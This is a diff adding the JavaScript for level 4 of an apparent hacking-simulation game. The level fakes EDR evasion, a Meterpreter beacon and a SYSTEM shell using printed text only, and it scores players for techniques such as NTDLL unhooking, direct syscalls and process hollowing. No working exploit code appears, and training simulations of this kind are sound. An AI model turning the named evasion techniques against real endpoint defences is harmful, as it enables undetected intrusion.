+      print('╚════════════════════════════════════════════════════════════════════════╝', 'error');
+      print('');
+      print('[X] Payload was detected and blocked!', 'error');
+      print('[*] You need to use evasion techniques before executing', 'info');
+
+      state.alerts++;
+      state.detected = true;
+      playError();
+      autosave();
+      return;
+    }
+
+    // Successful execution with evasion
+    await simulateLoading('Deploying payload to target', 2000);
+    print('');
+    print(`[*] Uploading ${file} to target...`, 'system');
+
+    if (state.unhookedNtdll) {
+      print('[*] NTDLL hooks restored from disk copy...', 'success');
+    }
+
+    print('[*] Executing payload...', 'system');
+    await sleep(1500);
+
+    print('');
+    print('╔════════════════════════════════════════════════════════════════════════╗', 'success');
+    print('║                      PAYLOAD EXECUTED SUCCESSFULLY                      ║', 'success');
+    print('╠════════════════════════════════════════════════════════════════════════╣', 'success');
+    print('║  EDR Status:     NO ALERTS TRIGGERED                                   ║', 'success');
+    print('║  Evasion:        ' + (LEVEL4_EDR.bypassMethods.join(' + ') || 'N/A').padEnd(50) + ' ║', 'info');
+    print('║  Beacon:         ACTIVE                                                ║', 'success');
+    print('║  Session:        Meterpreter #1                                        ║', 'success');
+    print('╚════════════════════════════════════════════════════════════════════════╝', 'success');
+    print('');
+    print('[+] Shellcode executed without EDR detection!', 'success');
+    print('[+] Beacon established - check with "beacon" command', 'info');
+
+    state.edrBypassed = true;
+    state.payloadLoaded = true;
+
+    addEasterEgg('lvl4_ghost', 'A ghost in the machine... EDR never saw you.');
+    playSuccess();
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // BEACON - Check beacon status
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'beacon') {
+    if (!state.edrBypassed) {
+      print('[!] No active beacon - execute a payload first', 'error');
+      return;
+    }
+
+    print('');
+    print('╔════════════════════════════════════════════════════════════════════════╗', 'success');
+    print('║                         ACTIVE BEACONS                                  ║', 'success');
+    print('╠════════════════════════════════════════════════════════════════════════╣', 'success');
+    print('║  ID   Type           Host                   User           Last Seen   ║', 'info');
+    print('║  ─────────────────────────────────────────────────────────────────────║', 'info');
+    print('║  1    Meterpreter    SECURE-WKS01           SYSTEM         Just now    ║', 'success');
+    print('╚════════════════════════════════════════════════════════════════════════╝', 'success');
+    print('');
+    print('[*] meterpreter > ', 'system');
+    print('');
+
+    if (!state.shellObtained) {
+      state.shellObtained = true;
+      print('[+] SYSTEM shell obtained on target!', 'success');
+      print('');
+      completeLevel();
+    }
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // ALERTS - Show EDR alerts
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'alerts') {
+    print('');
+    print('╔═══════════════════════════════════════════════════════════════════╗', state.alerts > 0 ? 'error' : 'success');
+    print('║                    EDR ALERT STATUS                               ║', state.alerts > 0 ? 'error' : 'success');
+    print('╠═══════════════════════════════════════════════════════════════════╣', state.alerts > 0 ? 'error' : 'success');
+    print(`║  Total Alerts: ${state.alerts}                                                   ║`, state.alerts > 0 ? 'error' : 'success');
+    print(`║  Status: ${state.detected ? 'COMPROMISED - Incident Created' : 'CLEAN - No Detection'}                        ║`, state.detected ? 'error' : 'success');
+    print('╚═══════════════════════════════════════════════════════════════════╝', state.alerts > 0 ? 'error' : 'success');
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SHELL COMMANDS
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'whoami') {
+    if (state.shellObtained) {
+      print('nt authority\\system', 'success');
+    } else {
+      print('operator', 'system');
+    }
+    return;
+  }
+
+  if (cmd === 'hostname') {
+    if (state.shellObtained) {
+      print('SECURE-WKS01', 'system');
+    } else {
+      print('C2-SERVER', 'system');
+    }
+    return;
+  }
+
+  print(`Command not found: ${cmd}`, 'error');
+}
+
+function calculateLevel4Progress(state) {
+  let progress = 0;
+
+  // Analysis (20%)
+  if (state.analyzedEDR) progress += 10;
+  if (state.foundHooks) progress += 10;
+
+  // Code modification (30%)
+  if (state.openedEditor) progress += 10;
+  if (state.modifiedCode) progress += 10;
+  if (state.compiledPayload) progress += 10;
+
+  // Evasion (20%)
+  if (state.unhookedNtdll || state.usedSyscalls || state.usedHollowing) progress += 20;
+
+  // Execution (30%)
+  if (state.edrBypassed) progress += 15;
+  if (state.shellObtained) progress += 15;
+
+  return Math.min(progress, 100);
+}
+</script>
